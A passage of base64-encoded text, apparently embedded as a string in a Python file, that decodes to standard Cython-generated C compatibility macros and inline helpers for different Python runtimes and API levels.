19fKQogICAgI2RlZmluZSBDWVRIT05fSU5MSU5FIF9faW5saW5lX18KICAjZWxpZiBkZWZpbmVkKF9NU0NfVkVSKQogICAgI2RlZmluZSBDWVRIT05fSU5MSU5FIF9faW5saW5lCiAgI2VsaWYgZGVmaW5lZCAoX19TVERDX1ZFUlNJT05fXykgJiYgX19TVERDX1ZFUlNJT05fXyA+PSAxOTk5MDFMCiAgICAjZGVmaW5lIENZVEhPTl9JTkxJTkUgaW5saW5lCiAgI2Vsc2UKICAgICNkZWZpbmUgQ1lUSE9OX0lOTElORQogICNlbmRpZgojZW5kaWYKCgojZGVmaW5lIF9fUFlYX0JVSUxEX1BZX1NTSVpFX1QgIm4iCiNkZWZpbmUgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJ6IgojZGVmaW5lIF9fUHl4X0JVSUxUSU5fTU9EVUxFX05BTUUgImJ1aWx0aW5zIgojZGVmaW5lIF9fUHl4X0RlZmF1bHRDbGFzc1R5cGUgUHlUeXBlX1R5cGUKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICNpZm5kZWYgQ09fT1BUSU1JWkVECiAgICBzdGF0aWMgaW50IENPX09QVElNSVpFRDsKICAgICNlbmRpZgogICAgI2lmbmRlZiBDT19ORVdMT0NBTFMKICAgIHN0YXRpYyBpbnQgQ09fTkVXTE9DQUxTOwogICAgI2VuZGlmCiAgICAjaWZuZGVmIENPX1ZBUkFSR1MKICAgIHN0YXRpYyBpbnQgQ09fVkFSQVJHUzsKICAgICNlbmRpZgogICAgI2lmbmRlZiBDT19WQVJLRVlXT1JEUwogICAgc3RhdGljIGludCBDT19WQVJLRVlXT1JEUzsKICAgICNlbmRpZgogICAgI2lmbmRlZiBDT19BU1lOQ19HRU5FUkFUT1IKICAgIHN0YXRpYyBp""bnQgQ09fQVNZTkNfR0VORVJBVE9SOwogICAgI2VuZGlmCiAgICAjaWZuZGVmIENPX0dFTkVSQVRPUgogICAgc3RhdGljIGludCBDT19HRU5FUkFUT1I7CiAgICAjZW5kaWYKICAgICNpZm5kZWYgQ09fQ09ST1VUSU5FCiAgICBzdGF0aWMgaW50IENPX0NPUk9VVElORTsKICAgICNlbmRpZgojZWxzZQogICAgI2lmbmRlZiBDT19DT1JPVVRJTkUKICAgICAgI2RlZmluZSBDT19DT1JPVVRJTkUgMHg4MAogICAgI2VuZGlmCiAgICAjaWZuZGVmIENPX0FTWU5DX0dFTkVSQVRPUgogICAgICAjZGVmaW5lIENPX0FTWU5DX0dFTkVSQVRPUiAweDIwMAogICAgI2VuZGlmCiNlbmRpZgpzdGF0aWMgaW50IF9fUHl4X2luaXRfY29fdmFyaWFibGVzKHZvaWQpOwojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDBBNCB8fCBkZWZpbmVkKFB5X0lTX1RZUEUpCiAgI2RlZmluZSBfX1B5eF9JU19UWVBFKG9iLCB0eXBlKSBQeV9JU19UWVBFKG9iLCB0eXBlKQojZWxzZQogICNkZWZpbmUgX19QeXhfSVNfVFlQRShvYiwgdHlwZSkgKCgoY29uc3QgUHlPYmplY3QqKW9iKS0+b2JfdHlwZSA9PSAodHlwZSkpCiNlbmRpZgojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBCMSB8fCBkZWZpbmVkKFB5X0lzKQogICNkZWZpbmUgX19QeXhfUHlfSXMoeCwgeSkgIFB5X0lzKHgsIHkpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeV9Jcyh4LCB5KSAoKHgpID09ICh5KSkKI2VuZGlmCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMEIxIHx8IGRlZmluZWQoUHlfSXNOb25lKQogICNkZWZpbmUgX19QeXhfUHlfSXNOb25lKG9iKSBQeV9Jc05vbmUob2IpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeV9Jc05vbmUob2IpIF9fUHl4X1B5X0lzKChvYiksIFB5X05vbmUpCiNlbmRpZgojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBCMSB8fCBkZWZpbmVkKFB5X0lzVHJ1ZSkKICAjZGVmaW5lIF9fUHl4X1B5X0lzVHJ1ZShvYikgUHlfSXNUcnVlKG9iKQojZWxzZQogICNkZWZpbmUgX19QeXhfUHlfSXNUcnVlKG9iKSBfX1B5eF9QeV9Jcygob2IpLCBQeV9UcnVlKQojZW5kaWYKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwQjEgfHwgZGVmaW5lZChQeV9Jc0ZhbHNlKQogICNkZWZpbmUgX19QeXhfUHlfSXNGYWxzZShvYikgUHlfSXNGYWxzZShvYikKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5X0lzRmFsc2Uob2IpIF9fUHl4X1B5X0lzKChvYiksIFB5X0ZhbHNlKQojZW5kaWYKI2RlZmluZSBfX1B5eF9Ob25lQXNOdWxsKG9iaikgIChfX1B5eF9QeV9Jc05vbmUob2JqKSA/IE5VTEwgOiAob2JqKSkKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwRjAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICNkZWZpbmUgX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykgUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pIF9QeUdDX0ZJTkFMSVpFRChvKQojZW5k""aWYKI2lmbmRlZiBQeV9UUEZMQUdTX0NIRUNLVFlQRVMKICAjZGVmaW5lIFB5X1RQRkxBR1NfQ0hFQ0tUWVBFUyAwCiNlbmRpZgojaWZuZGVmIFB5X1RQRkxBR1NfSEFWRV9JTkRFWAogICNkZWZpbmUgUHlfVFBGTEFHU19IQVZFX0lOREVYIDAKI2VuZGlmCiNpZm5kZWYgUHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUgogICNkZWZpbmUgUHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUiAwCiNlbmRpZgojaWZuZGVmIFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRQogICNkZWZpbmUgUHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFIDAKI2VuZGlmCiNpZm5kZWYgUHlfVFBGTEFHU19TRVFVRU5DRQogICNkZWZpbmUgUHlfVFBGTEFHU19TRVFVRU5DRSAwCiNlbmRpZgojaWZuZGVmIFB5X1RQRkxBR1NfTUFQUElORwogICNkZWZpbmUgUHlfVFBGTEFHU19NQVBQSU5HIDAKI2VuZGlmCiNpZm5kZWYgTUVUSF9TVEFDS0xFU1MKICAjZGVmaW5lIE1FVEhfU1RBQ0tMRVNTIDAKI2VuZGlmCiNpZm5kZWYgTUVUSF9GQVNUQ0FMTAogICNpZm5kZWYgTUVUSF9GQVNUQ0FMTAogICAgICNkZWZpbmUgTUVUSF9GQVNUQ0FMTCAweDgwCiAgI2VuZGlmCiAgdHlwZWRlZiBQeU9iamVjdCAqKCpfX1B5eF9QeUNGdW5jdGlvbkZhc3QpIChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBQeV9zc2l6ZV90IG5hcmdzKTsKICB0eXBlZGVmIFB5T2JqZWN0ICooKl9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcykgKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9zc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3duYW1lcyk7CiNlbHNlCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTQKICAjICBkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25GYXN0IFB5Q0Z1bmN0aW9uRmFzdAogICMgIGRlZmluZSBfX1B5eF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMgUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzCiAgI2Vsc2UKICAjICBkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25GYXN0IF9QeUNGdW5jdGlvbkZhc3QKICAjICBkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzIF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMKICAjZW5kaWYKI2VuZGlmCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNkZWZpbmUgX19QeXhfTUVUSF9GQVNUQ0FMTCBNRVRIX0ZBU1RDQUxMCiAgI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbCBfX1B5eF9QeUNGdW5jdGlvbkZhc3QKICAjZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcwojZWxzZQogICNkZWZpbmUgX19QeXhfTUVUSF9GQVNUQ0FMTCBNRVRIX1ZBUkFSR1MKICAjZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsIFB5Q0Z1bmN0aW9uCiAg""I2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcyBQeUNGdW5jdGlvbldpdGhLZXl3b3JkcwojZW5kaWYKI2lmIENZVEhPTl9WRUNUT1JDQUxMCiAgI2RlZmluZSBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2ZWN0b3JjYWxsZnVuYwogICNkZWZpbmUgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUICBQWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQKICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9OQVJHUyhuKSAgUHlWZWN0b3JjYWxsX05BUkdTKChzaXplX3QpKG4pKQojZWxpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTAogIHR5cGVkZWYgUHlPYmplY3QgKigqX19weXhfdmVjdG9yY2FsbGZ1bmMpKFB5T2JqZWN0ICpjYWxsYWJsZSwgUHlPYmplY3QgKmNvbnN0ICphcmdzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKTsKICAjZGVmaW5lIF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCAgKChzaXplX3QpMSA8PCAoOCAqIHNpemVvZihzaXplX3QpIC0gMSkpCiAgI2RlZmluZSBfX1B5eF9QeVZlY3RvcmNhbGxfTkFSR1MobikgICgoUHlfc3NpemVfdCkoKChzaXplX3QpKG4pKSAmIH5fX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKQojZWxzZQogICNkZWZpbmUgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUICAwCiAgI2RlZmluZSBfX1B5eF9QeVZlY3RvcmNhbGxfTkFSR1MobikgICgoUHlfc3NpemVfdCkobikpCiNlbmRpZgojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDBCMQojZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uX0NoZWNrRXhhY3QoZnVuYykgIFB5Q0Z1bmN0aW9uX0NoZWNrRXhhY3QoZnVuYykKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9DaGVja0V4YWN0KGZ1bmMpICBQeUNGdW5jdGlvbl9DaGVjayhmdW5jKQojZW5kaWYKI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgIFB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpICAoKChQeUNGdW5jdGlvbk9iamVjdCopKGZ1bmMpKS0+bV9tbC0+bWxfbWV0aCkKI2VsaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpICBQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYykKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZMQUdTKGZ1bmMpICAoKChQeUNGdW5jdGlvbk9iamVjdCopKGZ1bmMpKS0+bV9tbC0+bWxfZmxhZ3MpCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9DeU9yUHlDRnVuY3Rpb25f""R0VUX1NFTEYoUHlPYmplY3QgKmZ1bmMpIHsKICAgIHJldHVybiAoX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GTEFHUyhmdW5jKSAmIE1FVEhfU1RBVElDKSA/IE5VTEwgOiAoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jKS0+bV9zZWxmOwp9CiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfX0lzU2FtZUNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgcmV0dXJuIFB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpICYmIFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGZ1bmMpID09IChQeUNGdW5jdGlvbikgY2Z1bmM7CiNlbHNlCiAgICByZXR1cm4gUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpID09IChQeUNGdW5jdGlvbikgY2Z1bmM7CiNlbmRpZgp9CiNkZWZpbmUgX19QeXhfSXNTYW1lQ0Z1bmN0aW9uKGZ1bmMsIGNmdW5jKSAgIF9fUHl4X19Jc1NhbWVDRnVuY3Rpb24oZnVuYywgY2Z1bmMpCiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMAogICNkZWZpbmUgX19QeXhfUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKG0sIHMsIGIpICAoKHZvaWQpbSwgUHlUeXBlX0Zyb21TcGVjV2l0aEJhc2VzKHMsIGIpKQogIHR5cGVkZWYgUHlPYmplY3QgKigqX19QeXhfUHlDTWV0aG9kKShQeU9iamVjdCAqLCBQeVR5cGVPYmplY3QgKiwgUHlPYmplY3QgKmNvbnN0ICosIHNpemVfdCwgUHlPYmplY3QgKik7CiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMobSwgcywgYikgIFB5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhtLCBzLCBiKQogICNkZWZpbmUgX19QeXhfUHlDTWV0aG9kICBQeUNNZXRob2QKI2VuZGlmCiNpZm5kZWYgTUVUSF9NRVRIT0QKICAjZGVmaW5lIE1FVEhfTUVUSE9EIDB4MjAwCiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmICFkZWZpbmVkKFB5T2JqZWN0X01hbGxvYykKICAjZGVmaW5lIFB5T2JqZWN0X01hbGxvYyhzKSAgIFB5TWVtX01hbGxvYyhzKQogICNkZWZpbmUgUHlPYmplY3RfRnJlZShwKSAgICAgUHlNZW1fRnJlZShwKQogICNkZWZpbmUgUHlPYmplY3RfUmVhbGxvYyhwKSAgUHlNZW1fUmVhbGxvYyhwKQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfU2V0TGluZU51bWJlcihmcmFtZSwgbGluZW5vKQojZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMCiAgI2RlZmluZSBfX1B5eF9QeUNvZGVfSGFzRnJlZVZhcnMoY28pICAoUHlDb2RlX0dldE51bUZyZWUoY28pID4gMCkKICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfU2V0TGluZU51bWJlcihmcmFtZSwgbGluZW5vKSBfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKChmcmFtZSksIChsaW5lbm8pKQojZWxzZQogICNkZWZpbmUgX19QeXhfUHlDb2Rl""X0hhc0ZyZWVWYXJzKGNvKSAgKFB5Q29kZV9HZXROdW1GcmVlKGNvKSA+IDApCiAgI2RlZmluZSBfX1B5eF9QeUZyYW1lX1NldExpbmVOdW1iZXIoZnJhbWUsIGxpbmVubykgIChmcmFtZSktPmZfbGluZW5vID0gKGxpbmVubykKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQgUHlUaHJlYWRTdGF0ZV9HZXQoKQojZWxpZiAhQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQgUHlUaHJlYWRTdGF0ZV9HRVQoKQojZWxpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEExCiAgI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQgUHlUaHJlYWRTdGF0ZV9HZXRVbmNoZWNrZWQoKQojZWxzZQogICNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50IF9QeVRocmVhZFN0YXRlX1VuY2hlY2tlZEdldCgpCiNlbmRpZgojaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCAqX19QeXhfX1B5TW9kdWxlX0dldFN0YXRlKFB5T2JqZWN0ICpvcCkKewogICAgdm9pZCAqcmVzdWx0OwogICAgcmVzdWx0ID0gUHlNb2R1bGVfR2V0U3RhdGUob3ApOwogICAgaWYgKCFyZXN1bHQpCiAgICAgICAgUHlfRmF0YWxFcnJvcigiQ291bGRuJ3QgZmluZCB0aGUgbW9kdWxlIHN0YXRlIik7CiAgICByZXR1cm4gcmVzdWx0Owp9CiNkZWZpbmUgX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobykgKF9fcHl4X21zdGF0ZXR5cGUgKilfX1B5eF9fUHlNb2R1bGVfR2V0U3RhdGUobykKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShvcCkgKCh2b2lkKW9wLF9fcHl4X21zdGF0ZV9nbG9iYWwpCiNlbmRpZgojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldFNsb3Qob2JqLCBuYW1lLCBmdW5jX2N0eXBlKSAgX19QeXhfUHlUeXBlX0dldFNsb3QoUHlfVFlQRSgoUHlPYmplY3QgKikgb2JqKSwgbmFtZSwgZnVuY19jdHlwZSkKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9UcnlHZXRTbG90KG9iaiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX1RyeUdldFNsb3QoUHlfVFlQRShvYmopLCBuYW1lLCBmdW5jX2N0eXBlKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldFN1YlNsb3Qob2JqLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9HZXRTdWJTbG90KFB5X1RZUEUob2JqKSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X1RyeUdldFN1YlNsb3Qob2JqLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9UcnlHZXRTdWJTbG90KFB5X1RZUEUob2JqKSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKQojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0eXBlLCBuYW1lLCBmdW5jX2N0eXBlKSAgKCh0eXBlKS0+bmFtZSkKICAjZGVm""aW5lIF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9HZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpCiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0U3ViU2xvdCh0eXBlLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpICgoKHR5cGUpLT5zdWIpID8gKCh0eXBlKS0+c3ViLT5uYW1lKSA6IE5VTEwpCiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfVHJ5R2V0U3ViU2xvdCh0eXBlLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9HZXRTdWJTbG90KHR5cGUsIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpICAoKGZ1bmNfY3R5cGUpIFB5VHlwZV9HZXRTbG90KCh0eXBlKSwgUHlfIyNuYW1lKSkKICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpXAogICAgKChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAgfHxcCiAgICAgKFB5VHlwZV9HZXRGbGFncyh0eXBlKSAmIFB5X1RQRkxBR1NfSEVBUFRZUEUpIHx8IF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24oKSA+PSAweDAzMEEwMDAwKSA/XAogICAgIF9fUHl4X1B5VHlwZV9HZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpIDogTlVMTCkKICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRTdWJTbG90KG9iaiwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKSBfX1B5eF9QeVR5cGVfR2V0U2xvdChvYmosIG5hbWUsIGZ1bmNfY3R5cGUpCiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfVHJ5R2V0U3ViU2xvdChvYmosIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX1RyeUdldFNsb3Qob2JqLCBuYW1lLCBmdW5jX2N0eXBlKQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBkZWZpbmVkKF9QeURpY3RfTmV3UHJlc2l6ZWQpCiNkZWZpbmUgX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKG4pICAoKG4gPD0gOCkgPyBQeURpY3RfTmV3KCkgOiBfUHlEaWN0X05ld1ByZXNpemVkKG4pKQojZWxzZQojZGVmaW5lIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKSAgUHlEaWN0X05ldygpCiNlbmRpZgojZGVmaW5lIF9fUHl4X1B5TnVtYmVyX0RpdmlkZSh4LHkpICAgICAgICAgUHlOdW1iZXJfVHJ1ZURpdmlkZSh4LHkpCiNkZWZpbmUgX19QeXhfUHlOdW1iZXJfSW5QbGFjZURpdmlkZSh4LHkpICBQeU51bWJlcl9JblBsYWNlVHJ1ZURpdmlkZSh4LHkpCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUwojZGVmaW5lIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyV2l0aEVycm9yKGRpY3QsIG5hbWUpICBfUHlEaWN0X0dldEl0ZW1fS25vd25IYXNoKGRpY3QsIG5hbWUsICgoUHlBU0NJSU9iamVjdCAqKSBuYW1lKS0+aGFzaCkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmpl""Y3QgKiBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cihQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKm5hbWUpIHsKICAgIFB5T2JqZWN0ICpyZXMgPSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvcihkaWN0LCBuYW1lKTsKICAgIGlmIChyZXMgPT0gTlVMTCkgUHlFcnJfQ2xlYXIoKTsKICAgIHJldHVybiByZXM7Cn0KI2VsaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMjAwMDAKI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvciAgUHlEaWN0X0dldEl0ZW1XaXRoRXJyb3IKI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0ciAgICAgICAgICAgUHlEaWN0X0dldEl0ZW0KI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvcihQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKm5hbWUpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgcmV0dXJuIFB5RGljdF9HZXRJdGVtKGRpY3QsIG5hbWUpOwojZWxzZQogICAgUHlEaWN0RW50cnkgKmVwOwogICAgUHlEaWN0T2JqZWN0ICptcCA9IChQeURpY3RPYmplY3QqKSBkaWN0OwogICAgbG9uZyBoYXNoID0gKChQeVN0cmluZ09iamVjdCAqKSBuYW1lKS0+b2Jfc2hhc2g7CiAgICBhc3NlcnQoaGFzaCAhPSAtMSk7CiAgICBlcCA9IChtcC0+bWFfbG9va3VwKShtcCwgbmFtZSwgaGFzaCk7CiAgICBpZiAoZXAgPT0gTlVMTCkgewogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgcmV0dXJuIGVwLT5tZV92YWx1ZTsKI2VuZGlmCn0KI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0ciAgICAgICAgICAgUHlEaWN0X0dldEl0ZW0KI2VuZGlmCiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRGbGFncyh0cCkgICAoKChQeVR5cGVPYmplY3QgKil0cCktPnRwX2ZsYWdzKQogICNkZWZpbmUgX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUodHlwZSwgZmVhdHVyZSkgICgoX19QeXhfUHlUeXBlX0dldEZsYWdzKHR5cGUpICYgKGZlYXR1cmUpKSAhPSAwKQojZWxzZQogICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldEZsYWdzKHRwKSAgIChQeVR5cGVfR2V0RmxhZ3MoKFB5VHlwZU9iamVjdCAqKXRwKSkKICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKHR5cGUsIGZlYXR1cmUpICBQeVR5cGVfSGFzRmVhdHVyZSh0eXBlLCBmZWF0dXJlKQojZW5kaWYKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoaXRlcmF0b3IpICBfX1B5eF9QeU9iamVjdF9HZXRTbG90KGl0ZXJhdG9yLCB0cF9pdGVybmV4dCwgaXRlcm5leHRmdW5jKQojaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDAKI2RlZmluZSBfX1B5eF9QeUhlYXBUeXBlT2JqZWN0X0dDX0RlbChvYmopICB7XAogICAgUHlUeXBlT2JqZWN0ICp0eXBlID0gUHlfVFlQRSgo""UHlPYmplY3QqKW9iaik7XAogICAgYXNzZXJ0KF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKHR5cGUsIFB5X1RQRkxBR1NfSEVBUFRZUEUpKTtcCiAgICBQeU9iamVjdF9HQ19EZWwob2JqKTtcCiAgICBQeV9ERUNSRUYodHlwZSk7XAp9CiNlbHNlCiNkZWZpbmUgX19QeXhfUHlIZWFwVHlwZU9iamVjdF9HQ19EZWwob2JqKSAgUHlPYmplY3RfR0NfRGVsKG9iaikKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRFkob3ApICAgICAgICgwKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQURfQ0hBUih1LCBpKSBQeVVuaWNvZGVfUmVhZENoYXIodSwgaSkKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRSh1KSAgICgodm9pZCl1LCAxMTE0MTExVSkKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9LSU5EKHUpICAgICAgICAgKCh2b2lkKXUsICgwKSkKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9EQVRBKHUpICA